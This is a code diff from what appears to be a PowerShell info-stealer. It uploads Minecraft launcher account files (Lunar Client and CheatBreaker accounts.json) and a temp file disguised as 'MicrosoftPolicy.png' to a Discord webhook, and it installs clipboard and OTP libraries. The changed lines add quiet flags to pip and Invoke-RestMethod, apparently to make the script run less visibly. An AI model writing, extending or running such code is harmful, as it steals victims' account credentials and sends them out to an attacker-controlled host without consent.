@@ -41,7 +41,7 @@ powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -A
 ###################################################################
 
 #####################################################################
-python.exe -m pip install --upgrade pip
+python.exe -m pip install --upgrade --quiet pip
 pip install httpx --quiet
 pip install pyperclip --quiet 
 pip install pyotp --quiet
@@ -150,7 +150,7 @@ Upload-Discord -text "||<@767438758902759494>||"
 Start-Sleep -Seconds 3
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
-Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json' -Quiet
 Start-Sleep -Seconds 2
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
